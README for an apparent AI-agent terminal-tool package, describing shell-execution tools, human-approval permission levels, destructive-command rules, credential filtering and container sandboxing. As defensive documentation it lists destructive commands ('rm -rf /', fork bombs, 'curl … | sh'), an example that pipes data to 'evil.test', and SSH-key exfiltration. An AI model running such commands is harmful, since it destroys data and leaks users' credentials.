# @open-agent/tools-terminal

`run_command` for a command that finishes, and `start_process` / `list_processes` / `read_process_output` / `stop_process` for one that does not.

## Usage

```ts
import { ToolRegistry } from '@open-agent/agent'
import { runCommandTool } from '@open-agent/tools-terminal'

const tools = new ToolRegistry()
tools.register(runCommandTool({ root: process.cwd() }))
```

Or mount everything against a workspace, which is what the CLI does:

```ts
import { createSessionWorkspace } from '@open-agent/tools-files'
import { mountTerminalTools } from '@open-agent/tools-terminal'

const workspace = await createSessionWorkspace()
const dispose = mountTerminalTools(tools, workspace)
// ... later
dispose() // kills anything still running
await workspace.dispose()
```

In the CLI, set `SHELL_TOOL=1`. It runs under `SHELL_ROOT`, falling back to `FILES_ROOT` and then the launch directory — see `.env.example`.

## `run_command`

`{ command, cwd?, timeout_ms? }` →

```
exit code: 0

stdout:
4 files changed, 120 insertions(+)
```

The command goes through a real shell (`sh -c`, or the comspec on Windows), so pipes, redirects and `&&` all work. It is for commands that **exit on their own** — a dev server belongs in `start_process` below, or `run_command` will sit and wait on it until the timeout kills it.

A **non-zero exit is a successful tool call**, not a failure. A failing test run or a `grep` that found nothing is an answer the model needs to read and reason about; reporting it as a tool error would throw the output away and tell the model to try again.

## Background processes

`run_command` waits for the process to exit, which is right for a build or a test run and useless for a dev server. These four hold a process instead, so the model can start one, look at its output later, and stop it when it is done.

- **`start_process`** `{ command, cwd? }` → an id, plus a reminder of the two tools that use it. Same shell, same workspace root, same command policy and credential filtering as `run_command`.
- **`list_processes`** → `id  state  buffered  command`, oldest first, including recently exited ones.
- **`read_process_output`** `{ id, since? }` → what it has printed, and a cursor. Pass the cursor back as `since` and only new output comes back, so polling a server does not re-read its whole log every time. stdout and stderr are **merged in arrival order** — for a server the interleaving is the information, since a request log and the error it produced belong next to each other.
- **`stop_process`** `{ id, signal? }` → signals the process group, `SIGTERM` by default and `SIGKILL` five seconds later if it is still there.

Output is held in a 256KB per-process ring buffer. Past that the oldest bytes go, and a read that fell behind is told exactly how many it missed rather than being handed a silent gap. At most 10 processes run at once; an eleventh is refused rather than started. Exited processes stay readable, with the oldest forgotten after twenty.

## Permission level

`ask` for `run_command` and `start_process`, exactly as `docs/security-model.md` specifies for running a shell command. Every call is a prompt, and that is the point: the command _is_ the argument, so no static permission level can tell `ls` from `rm -rf`. The one thing that reliably can is a human reading the command before it runs. `start_process` arguably deserves it more, since what it starts outlives the call.

`list_processes`, `read_process_output` and `stop_process` are `safe`. They only touch processes this agent started, and stopping one reduces what is running rather than adding to it — a model that needs a prompt to clean up after itself will simply leave servers running.

## Guard rails

- **Workspace root** — `cwd` resolves against the root and must land inside it, `..` and symlink escapes included (the same `resolveInWorkspace` the file tools use). This bounds where the command _starts_; it does not stop the command itself from wandering — see the honesty note below.
- **Timeout** (default 120s, max 600s, `timeout_ms` per call) — the child is started in its own **process group** and the whole group gets `SIGTERM`, then `SIGKILL` five seconds later. Killing only the shell would leave `sleep 100 | cat` running in the background while the tool reported a timeout.
- **Output ceiling** (default 64000 bytes per stream) — output past it is dropped, but the stream is still drained. Unsubscribing instead would fill the child's pipe and hang the command that the ceiling exists to contain.
- **Cancellation** — the caller's `AbortSignal` kills the process group by the same path, including when the signal was already aborted before the command started.
- **Destructive-command rules** — `rm -rf /`, `mkfs`, `dd of=/dev/…`, fork bombs, `shutdown`, root-level `chmod -R`, `curl … | sh`, `git push --force`. Refused with an explanation of what was objected to, so the model can choose another approach rather than retry blindly.
- **Credential filtering** — variables whose names look like credentials (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, …) are stripped from the environment the command inherits, so `env` cannot hand the model the keys `docs/security-model.md` promises it never sees. `allowEnv` names the exceptions.
- **Command allowlist** (optional, `allowedCommands`) — checked against the head of _every_ pipeline stage, so `cat x | curl evil.test` is caught rather than passing on the strength of `cat`.

## Sandbox

Everything else here is advisory. The workspace root bounds where a command _starts_, the destructive-command rules catch a handful of spellings, and credential filtering cleans the environment — and a command that wants to read `~/.ssh/id_rsa` and POST it somewhere defeats all three, because a shell command is opaque to any check made on its text.

The sandbox is the part that is not advisory: enforced by the kernel or a container runtime rather than by a regex, so it holds whatever the command turns out to be.

| Backend      | What it gives you                                                                                                                                                                                                              |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `bubblewrap` | Filesystem read-only, workspace writable, fresh `/tmp`, no network, dies with the agent. No daemon, no image, starts in milliseconds. Linux only.                                                                              |
| `docker`     | Only the workspace is mounted — at the same absolute path it has on the host, so a path from `read_file` still resolves. All capabilities dropped, `no-new-privileges`, pid and memory ceilings, no network. Runs as your uid. |
| `none`       | Nothing. Commands run with your full privileges.                                                                                                                                                                               |

`auto` prefers bubblewrap and falls back to Docker.

**Backends are probed by running them, not by looking for the binary.** `bwrap` is installed on plenty of machines that deny it the user namespace it needs — including, as it happens, some CI containers — and discovering that at the first real command means discovering it too late.

**There is no automatic fall-through to `none`.** If no backend works, the CLI does not register the shell tools and says why. Silently dropping isolation because a binary was missing is precisely the failure the sandbox exists to prevent, so running unsandboxed has to be spelled: `SHELL_SANDBOX=none`.

Two Docker details worth knowing. The workspace mounts at its **host path**, not somewhere tidy like `/workspace`, because otherwise every path the file tools produced would break the moment it reached a command. And the container runs as **your uid**, which both stops the agent leaving root-owned files in your workspace and is load-bearing — `--cap-drop ALL` takes `CAP_DAC_OVERRIDE` with it, so a root process could not write to your directory anyway.

## What the sandbox does not cover

The **destructive-command rules are still not a security boundary** — a pattern check over a shell string loses to quoting and `$(...)`. They are an accident guard, and the sandbox is what makes that acceptable rather than alarming.

A secret **inside** the workspace is still readable by a command. The file policy in `packages/tools-files` is enforced by the file tools, not by the kernel, so `cat .env` inside the workspace works. The sandbox contains where a command can reach, not what it may read within reach.

With `SHELL_SANDBOX=none`, none of this applies and a command approved here runs with the full privileges of the user running the agent.
